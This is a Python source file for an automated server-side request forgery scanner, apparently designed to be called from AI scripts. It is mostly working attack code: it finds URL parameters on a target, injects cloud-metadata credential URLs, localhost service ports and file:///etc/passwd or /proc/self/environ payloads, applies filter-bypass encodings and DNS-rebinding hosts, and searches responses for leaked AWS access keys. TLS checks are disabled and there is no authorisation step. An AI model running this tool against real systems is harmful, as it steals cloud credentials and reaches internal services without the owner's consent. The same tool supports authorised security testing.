"""
Zenith SSRF Scanner Module - Server-Side Request Forgery Detection
High-impact vulnerability especially in cloud environments (AWS, GCP, Azure).

Tests for SSRF by:
1. Discovering URL/redirect parameters
2. Injecting internal addresses (cloud metadata, localhost services)
3. Detecting blind SSRF via response time analysis
4. Testing common SSRF bypass techniques (DNS rebinding, URL encoding, etc.)

Usage from AI scripts:
    from zenith.modules.ssrf_scanner import SSRFScanner
    scanner = SSRFScanner("target.com")
    results = scanner.scan()
"""

import urllib.request
import urllib.parse
import urllib.error
import ssl
import json
import re
import time
import socket
import concurrent.futures


class SSRFScanner:
    """Automated SSRF vulnerability scanner."""

    # Parameters commonly vulnerable to SSRF
    SSRF_PARAMS = [
        'url', 'uri', 'link', 'src', 'source', 'dest', 'destination',
        'redirect', 'redirect_url', 'redirect_uri', 'return', 'return_url',
        'next', 'next_url', 'callback', 'callback_url', 'continue',
        'goto', 'target', 'path', 'file', 'page', 'feed', 'host',
        'site', 'html', 'to', 'out', 'view', 'dir', 'show', 'navigation',
        'open', 'domain', 'proxy', 'img', 'image', 'load', 'fetch',
        'request', 'download', 'remote', 'endpoint', 'api_url',
        'webhook', 'webhook_url', 'ping', 'avatar', 'avatar_url',
        'logo', 'logo_url', 'icon', 'preview', 'pdf_url', 'import_url',
    ]

    # Internal/cloud metadata endpoints to test
    SSRF_PAYLOADS = {
        # AWS EC2 Metadata (IMDSv1)
        'aws_metadata': [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/dynamic/instance-identity/document',
        ],
        # GCP Metadata
        'gcp_metadata': [
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/computeMetadata/v1/',
        ],
        # Azure Metadata
        'azure_metadata': [
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        ],
        # Internal services
        'localhost': [
            'http://127.0.0.1/',
            'http://127.0.0.1:80/',
            'http://127.0.0.1:8080/',
            'http://127.0.0.1:443/',
            'http://127.0.0.1:3000/',
            'http://127.0.0.1:8000/',
            'http://127.0.0.1:6379/',  # Redis
            'http://127.0.0.1:27017/',  # MongoDB
            'http://127.0.0.1:9200/',  # Elasticsearch
            'http://127.0.0.1:5432/',  # PostgreSQL
            'http://127.0.0.1:3306/',  # MySQL
            'http://127.0.0.1:11211/',  # Memcached
        ],
        # Alternative localhost representations
        'localhost_bypass': [
            'http://localhost/',
            'http://[::1]/',
            'http://0.0.0.0/',
            'http://0/',
            'http://0x7f000001/',
            'http://2130706433/',  # Decimal IP for 127.0.0.1
            'http://017700000001/',  # Octal
            'http://127.1/',
            'http://127.0.1/',
        ],
        # Protocol handlers
        'protocols': [
            'file:///etc/passwd',
            'file:///etc/hosts',
            'file:///proc/self/environ',
            'file:///proc/self/cmdline',
            'dict://127.0.0.1:6379/INFO',
            'gopher://127.0.0.1:6379/_INFO',
        ],
    }

    # Bypass techniques for WAF/filters
    BYPASS_TECHNIQUES = {
        'url_encoding': lambda url: url.replace('127.0.0.1', '%31%32%37%2e%30%2e%30%2e%31'),
        'double_encoding': lambda url: url.replace('127.0.0.1', '%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31'),
        'at_sign': lambda url: url.replace('http://', f'http://anything@'),
        'hash_bypass': lambda url: url + '#',
        'dotted_decimal': lambda url: url.replace('127.0.0.1', '0177.0.0.1'),
        'ipv6_mapped': lambda url: url.replace('127.0.0.1', '[::ffff:127.0.0.1]'),
        'dns_rebind': lambda url: url.replace('127.0.0.1', '127.0.0.1.nip.io'),
    }

    # Known indicators of successful SSRF
    SSRF_INDICATORS = {
        'aws': ['ami-id', 'instance-id', 'security-credentials', 'iam', 'AccessKeyId', 'SecretAccessKey'],
        'gcp': ['computeMetadata', 'google', 'project-id', 'service-accounts'],
        'azure': ['vmId', 'subscriptionId', 'resourceGroupName'],
        'localhost': ['root:', '/bin/bash', 'daemon:', 'www-data'],
        'internal': ['Connection refused', 'ERR_CONNECTION', 'ECONNREFUSED', 'redis_version', 'MongoDB'],
    }

    def __init__(self, target, base_url=None, cookies=None, headers=None, timeout=10):
        self.target = target
        self.base_url = base_url or f"https://{target}"
        self.timeout = timeout
        self.ctx = ssl._create_unverified_context()
        self.findings = []
        self.tested = 0
        self.cookies = cookies or ""
        self.custom_headers = headers or {}

    def _request(self, url, method="GET", data=None):
        """Make HTTP request with timing information."""
        start = time.time()
        try:
            hdrs = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': '*/*',
            }
            hdrs.update(self.custom_headers)
            if self.cookies:
                hdrs['Cookie'] = self.cookies

            if data and isinstance(data, dict):
                data = urllib.parse.urlencode(data).encode()
                hdrs['Content-Type'] = 'application/x-www-form-urlencoded'

            req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
            resp = urllib.request.urlopen(req, context=self.ctx, timeout=self.timeout)
            body = resp.read(100000).decode(errors='ignore')
            elapsed = time.time() - start
            return {
                'status': resp.status,
                'body': body,
                'headers': dict(resp.getheaders()),
                'length': len(body),
                'time': elapsed,
                'url': resp.url,
            }
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read(50000).decode(errors='ignore')
            except:
                pass
            elapsed = time.time() - start
            return {
                'status': e.code,
                'body': body,
                'headers': {},
                'length': len(body),
                'time': elapsed,
                'url': url,
            }
        except Exception as e:
            elapsed = time.time() - start
            return {
                'status': 0,
                'body': str(e),
                'headers': {},
                'length': 0,
                'time': elapsed,
                'url': url,
            }

    def _discover_params(self):
        """Discover URL parameters that might accept URLs."""
        found_params = {}
        print(f"  [*] Crawling {self.base_url} for URL parameters...")

        # Fetch main page
        resp = self._request(self.base_url)
        if not resp['body']:
            return found_params

        # Find all links with parameters
        urls = re.findall(r'(?:href|action|src)[="\']+([^"\'>\s]+\?[^"\'>\s]+)', resp['body'], re.I)

        # Find JS fetch/ajax calls
        js_urls = re.findall(r'["\']((?:https?://[^"\']+|/[^"\']+)\?[^"\']+)["\']', resp['body'])
        urls.extend(js_urls)

        for url in urls:
            if '?' in url:
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                for param in params:
                    if param.lower() in [p.lower() for p in self.SSRF_PARAMS]:
                        path = parsed.path or '/'
                        if path not in found_params:
                            found_params[path] = []
                        found_params[path].append(param)

        # Also check common endpoint paths for URL parameters
        common_paths = [
            '/api/proxy', '/api/fetch', '/api/load', '/api/preview',
            '/proxy', '/fetch', '/redirect', '/webhook', '/callback',
            '/import', '/export', '/download', '/pdf', '/screenshot',
            '/share', '/embed', '/oembed',
        ]
        for path in common_paths:
            resp = self._request(f"{self.base_url}{path}")
            if resp['status'] in (200, 301, 302, 400, 405):
                found_params[path] = ['url']
                print(f"  [+] Potential SSRF endpoint: {path} [{resp['status']}]")

        return found_params

    def _check_ssrf_response(self, resp, payload_category):
        """Check if response indicates successful SSRF."""
        body = resp.get('body', '').lower()
        indicators = self.SSRF_INDICATORS.get(payload_category, [])

        for indicator in indicators:
            if indicator.lower() in body:
                return True, indicator

        # Check for response that differs significantly from normal error
        if resp['status'] == 200 and resp['length'] > 50:
            # Might have fetched internal content
            if any(pattern in body for pattern in ['root:', 'ami-', 'instance', 'internal', 'private']):
                return True, "internal_content_detected"

        return False, None

    def _test_param_ssrf(self, path, param, payload, category):
        """Test a single parameter for SSRF."""
        test_url = f"{self.base_url}{path}?{param}={urllib.parse.quote(payload)}"
        resp = self._request(test_url)
        self.tested += 1

        is_vuln, indicator = self._check_ssrf_response(resp, category)
        if is_vuln:
            return {
                'type': 'SSRF',
                'severity': 'CRITICAL' if 'metadata' in category else 'HIGH',
                'url': test_url,
                'param': param,
                'payload': payload,
                'category': category,
                'indicator': indicator,
                'response_status': resp['status'],
                'response_length': resp['length'],
                'detail': f"SSRF via {param} parameter - {category} ({indicator})",
            }

        # Blind SSRF detection via response time
        # Internal services might cause delays
        if resp['time'] > 5 and category in ('localhost',):
            return {
                'type': 'BLIND_SSRF',
                'severity': 'MEDIUM',
                'url': test_url,
                'param': param,
                'payload': payload,
                'category': category,
                'response_time': resp['time'],
                'detail': f"Possible blind SSRF - {resp['time']:.1f}s response time for {payload}",
            }

        return None

    def _test_post_ssrf(self, path, param, payload, category):
        """Test SSRF via POST request body."""
        data = {param: payload}
        url = f"{self.base_url}{path}"
        resp = self._request(url, method="POST", data=data)
        self.tested += 1

        is_vuln, indicator = self._check_ssrf_response(resp, category)
        if is_vuln:
            return {
                'type': 'SSRF_POST',
                'severity': 'CRITICAL' if 'metadata' in category else 'HIGH',
                'url': url,
                'param': param,
                'payload': payload,
                'category': category,
                'indicator': indicator,
                'detail': f"SSRF via POST {param} - {category} ({indicator})",
            }
        return None

    def _test_header_ssrf(self, payload, category):
        """Test SSRF via HTTP headers."""
        ssrf_headers = [
            'X-Forwarded-For', 'X-Forwarded-Host', 'X-Original-URL',
            'X-Rewrite-URL', 'Referer', 'X-Custom-IP-Authorization',
            'X-Forwarded-Server', 'X-Host', 'X-HTTP-Host-Override',
        ]
        for header in ssrf_headers:
            hdrs = {header: payload}
            hdrs.update(self.custom_headers)
            try:
                req = urllib.request.Request(self.base_url, headers={
                    'User-Agent': 'Mozilla/5.0',
                    header: payload,
                })
                resp = urllib.request.urlopen(req, context=self.ctx, timeout=self.timeout)
                body = resp.read(50000).decode(errors='ignore')
                is_vuln, indicator = self._check_ssrf_response(
                    {'body': body, 'status': resp.status, 'length': len(body)}, category
                )
                self.tested += 1
                if is_vuln:
                    return {
                        'type': 'HEADER_SSRF',
                        'severity': 'HIGH',
                        'header': header,
                        'payload': payload,
                        'category': category,
                        'indicator': indicator,
                        'detail': f"SSRF via {header} header - {category}",
                    }
            except:
                pass
        return None

    def _test_bypass_techniques(self, path, param):
        """Test SSRF with WAF bypass techniques."""
        results = []
        base_payload = 'http://127.0.0.1/'

        for technique_name, transform in self.BYPASS_TECHNIQUES.items():
            try:
                bypass_payload = transform(base_payload)
                result = self._test_param_ssrf(path, param, bypass_payload, 'localhost')
                if result:
                    result['bypass_technique'] = technique_name
                    result['detail'] += f" (bypass: {technique_name})"
                    results.append(result)
            except Exception:
                continue

        return results

    def scan(self):
        """Run the full SSRF scan."""
        print(f"\n{'='*60}")
        print(f"  SSRF Scanner - {self.target}")
        print(f"{'='*60}")

        all_findings = []

        # Phase 1: Discover URL parameters
        print(f"\n[Phase 1] Parameter Discovery")
        params_map = self._discover_params()
        # Add fallback test paths
        if not params_map:
            params_map = {'/': self.SSRF_PARAMS[:10]}
        print(f"  [*] Found {sum(len(v) for v in params_map.values())} parameters across {len(params_map)} paths")

        # Phase 2: Test each parameter with SSRF payloads
        print(f"\n[Phase 2] SSRF Payload Testing")
        for path, params in params_map.items():
            for param in params:
                for category, payloads in self.SSRF_PAYLOADS.items():
                    for payload in payloads[:3]:  # Test top 3 payloads per category
                        # GET request
                        result = self._test_param_ssrf(path, param, payload, category)
                        if result:
                            all_findings.append(result)
                            print(f"  🔴 FOUND: {result['detail']}")

                        # POST request
                        result = self._test_post_ssrf(path, param, payload, category)
                        if result:
                            all_findings.append(result)
                            print(f"  🔴 FOUND: {result['detail']}")

        # Phase 3: Test header-based SSRF
        print(f"\n[Phase 3] Header-Based SSRF")
        for category in ['aws_metadata', 'localhost']:
            for payload in self.SSRF_PAYLOADS[category][:2]:
                result = self._test_header_ssrf(payload, category)
                if result:
                    all_findings.append(result)
                    print(f"  🔴 FOUND: {result['detail']}")

        # Phase 4: WAF Bypass techniques
        print(f"\n[Phase 4] WAF Bypass Testing")
        for path, params in list(params_map.items())[:3]:
            for param in params[:2]:
                bypass_results = self._test_bypass_techniques(path, param)
                all_findings.extend(bypass_results)
                for r in bypass_results:
                    print(f"  🔴 BYPASS: {r['detail']}")

        self.findings = all_findings

        # Report
        print(f"\n{'='*60}")
        print(f"  SSRF SCAN RESULTS")
        print(f"{'='*60}")
        print(f"  Requests made: {self.tested}")
        print(f"  Findings: {len(all_findings)}")

        if all_findings:
            for i, f in enumerate(all_findings, 1):
                sev = f.get('severity', 'INFO')
                sev_icon = '🔴' if sev == 'CRITICAL' else '🟠' if sev == 'HIGH' else '🟡'
                print(f"\n  {sev_icon} [{sev}] Finding #{i}: {f['type']}")
                print(f"     Detail: {f.get('detail', 'N/A')}")
                print(f"     Payload: {f.get('payload', 'N/A')}")
                if f.get('url'):
                    print(f"     URL: {f['url']}")
                if f.get('bypass_technique'):
                    print(f"     Bypass: {f['bypass_technique']}")
        else:
            print(f"\n  ✓ No SSRF vulnerabilities detected.")
            print(f"  Note: Blind SSRF may require out-of-band callback testing.")

        return all_findings


# CLI entry point
if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "TARGET_DOMAIN"
    cookies = sys.argv[2] if len(sys.argv) > 2 else ""
    scanner = SSRFScanner(target, cookies=cookies)
    results = scanner.scan()
    if results:
        print(f"\n⚠ TOTAL SSRF FINDINGS: {len(results)}")
        for r in results:
            print(json.dumps(r, indent=2))
